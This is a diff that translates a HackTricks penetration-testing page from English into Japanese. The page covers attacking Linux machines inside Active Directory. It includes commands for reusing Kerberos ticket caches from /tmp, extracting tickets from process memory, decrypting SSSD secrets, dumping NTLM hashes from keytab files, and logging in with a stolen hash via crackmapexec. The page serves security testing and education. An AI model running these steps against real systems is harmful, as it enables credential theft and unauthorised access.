@@ -4,25 +4,25 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* サイバーセキュリティ会社で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。
 
 </details>
 
-A linux machine can also be present inside an Active Directory environment.
+Linuxマシンは、Active Directory環境内に存在する場合もあります。
 
-A linux machine in an AD might be **storing different CCACHE tickets inside files. This tickets can be used and abused as any other kerberos ticket**. In order to read this tickets you will need to be the user owner of the ticket or **root** inside the machine.
+AD内のLinuxマシンでは、**さまざまなCCACHEチケットがファイル内に保存されている可能性があります。これらのチケットは、他のKerberosチケットと同様に使用および悪用することができます**。これらのチケットを読むには、チケットの所有者であるユーザーまたは**マシン内のroot**である必要があります。
 
-## Enumeration
+## 列挙
 
-### AD enumeration from linux
+### LinuxからのAD列挙
 
-If you have access over an AD in linux (or bash in Windows) you can try [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) to enumerate the AD.
+Linux（またはWindowsのbash）でADにアクセスできる場合、ADを列挙するために[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)を試すことができます。
 
-You can also check the following page to learn **other ways to enumerate AD from linux**:
+LinuxからADを列挙する**他の方法**については、次のページをチェックしてください：
 
 {% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
 [pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
@@ -30,28 +30,27 @@ You can also check the following page to learn **other ways to enumerate AD from
 
 ### FreeIPA
 
-It is an open source **alternative** to Microsoft Windows **Active** **Directory**, primarily used as an integrated management solution for **Unix** environments. Learn more about it in:
+これは、主に**Unix**環境の統合管理ソリューションとして使用される、Microsoft Windows **Active** **Directory**のオープンソースの**代替**です。詳細については、次のページを参照してください：
 
 {% content-ref url="../freeipa-pentesting.md" %}
 [freeipa-pentesting.md](../freeipa-pentesting.md)
 {% endcontent-ref %}
 
-## Playing with tickets
+## チケットの操作
 
-### Pass The Ticket
+### パス・ザ・チケット
 
-In this page you are going to find different places were you could **find kerberos tickets inside a linux host**, in the following page you can learn how to transform this CCache tickets formats to Kirbi (the format you need to use in Windows) and also how to perform a PTT attack:
+このページでは、Linuxホスト内のさまざまな場所で**Kerberosチケットを見つける**ことができます。次のページでは、これらのCCacheチケット形式をKirbi形式（Windowsで使用する形式）に変換する方法や、PTT攻撃を実行する方法について学ぶことができます：
 
 {% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
 [pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
 {% endcontent-ref %}
 
-### CCACHE ticket reuse from /tmp
+### /tmpからのCCACHEチケットの再利用
 
-> When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions
+> チケットがディスク上のファイルとして保存される場合、標準の形式とタイプはCCACHEファイルです。これは、Kerberos資格情報を保存するためのシンプルなバイナリファイル形式です。これらのファイルは通常、/tmpに保存され、600のアクセス許可でスコープが設定されます。
 
-List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be **reused by setting the environment variable** with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID.
-
+`env | grep KRB5CCNAME`を使用して、現在の認証に使用されているチケットをリストします。形式はポータブルであり、環境変数を設定することでチケットを**再利用**できます。`export KRB5CCNAME=/tmp/ticket.ccache`として環境変数を設定します。Kerberosチケット名の形式は`krb5cc_%{uid}`であり、uidはユーザーのUIDです。
 ```bash
 ls /tmp/ | grep krb5cc
 krb5cc_1000
@@ -60,11 +59,9 @@ krb5cc_1569901115
 
 export KRB5CCNAME=/tmp/krb5cc_1569901115
 ```
+### キーリングからのCCACHEチケットの再利用
 
-### CCACHE ticket reuse from keyring
-
-Processes may **store kerberos tickets inside their memory**, this tool can be useful to extract those tickets (ptrace protection should be disabled in the machine `/proc/sys/kernel/yama/ptrace_scope`): [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
-
+プロセスは**自身のメモリ内にKerberosチケットを保存**することがあります。このツールは、それらのチケットを抽出するのに役立ちます（マシンの`/proc/sys/kernel/yama/ptrace_scope`でptrace保護が無効になっている必要があります）: [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
 ```bash
 # Configuration and build
 git clone https://github.com/TarlogicSecurity/tickey
@@ -82,70 +79,57 @@ make CONF=Release
 [+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
 [X] [uid:0] Error retrieving tickets
 ```
+### SSSD KCMからのCCACHEチケットの再利用
 
-### CCACHE ticket reuse from SSSD KCM
+SSSDは、パス`/var/lib/sss/secrets/secrets.ldb`にデータベースのコピーを保持しています。対応するキーは、パス`/var/lib/sss/secrets/.secrets.mkey`に隠しファイルとして保存されています。デフォルトでは、このキーは**root**権限を持っている場合にのみ読み取ることができます。
 
-SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. By default, the key is only readable if you have **root** permissions.
-
-Invoking \*\*`SSSDKCMExtractor` \*\* with the --database and --key parameters will parse the database and **decrypt the secrets**.
-
+`SSSDKCMExtractor`を`--database`と`--key`パラメータと共に呼び出すと、データベースを解析し、**秘密情報を復号化**します。
 ```bash
 git clone https://github.com/fireeye/SSSDKCMExtractor
 python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
 ```
+**クレデンシャルキャッシュのKerberosブロブは、Mimikatz/Rubeusに渡すことができる使用可能なKerberos CCacheファイルに変換できます。**
 
-The **credential cache Kerberos blob can be converted into a usable Kerberos CCache** file that can be passed to Mimikatz/Rubeus.
-
-### CCACHE ticket reuse from keytab
-
+### キータブからのCCACHEチケットの再利用
 ```bash
 git clone https://github.com/its-a-feature/KeytabParser
 python KeytabParser.py /etc/krb5.keytab
 klist -k /etc/krb5.keytab
 ```
+### /etc/krb5.keytabからアカウントを抽出する
 
-### Extract accounts from /etc/krb5.keytab
+通常、rootとして実行されるサービスのサービスキーは、**`/etc/krb5.keytab`**というキータブファイルに保存されます。このサービスキーは、サービスのパスワードと同等であり、安全に保管する必要があります。
 
-The service keys used by services that run as root are usually stored in the keytab file **`/etc/krb5.keytab`**. This service key is the equivalent of the service's password, and must be kept secure.
-
-Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13\&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23 is the actual **NT Hash of the user**.
-
+[`klist`](https://adoptopenjdk.net/?variant=openjdk13\&jvmVariant=hotspot)を使用してキータブファイルを読み取り、その内容を解析します。キータイプが23の場合に表示されるキーは、実際の**ユーザーのNTハッシュ**です。
 ```
 klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
 [...]
 [26] Service principal: host/COMPUTER@DOMAIN
-	 KVNO: 25
-	 Key type: 23
-	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
-	 Time stamp: Oct 07,  2019 09:12:02
+KVNO: 25
+Key type: 23
+Key: 31d6cfe0d16ae931b73c59d7e0c089c0
+Time stamp: Oct 07,  2019 09:12:02
 [...]
 ```
-
-On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.
-
+Linuxでは、[`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract)を使用することができます。RC4 HMACハッシュを再利用するために必要です。
 ```bash
-python3 keytabextract.py krb5.keytab 
+python3 keytabextract.py krb5.keytab
 [!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
 [+] Keytab File successfully imported.
-        REALM : DOMAIN
-        SERVICE PRINCIPAL : host/computer.domain
-        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
+REALM : DOMAIN
+SERVICE PRINCIPAL : host/computer.domain
+NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
 ```
-
-On **macOS** you can use [**`bifrost`**](https://github.com/its-a-feature/bifrost).
-
+**macOS**では、[**`bifrost`**](https://github.com/its-a-feature/bifrost)を使用することができます。
 ```bash
 ./bifrost -action dump -source keytab -path test
 ```
-
-Connect to the machine using the account and the hash with CME.
-
+CMEを使用して、アカウントとハッシュを使用してマシンに接続します。
 ```bash
 $ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
-CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
+CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0
 ```
-
-## References
+## 参考文献
 
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)
 
@@ -153,10 +137,10 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **サイバーセキュリティ企業**で働いていますか？ HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
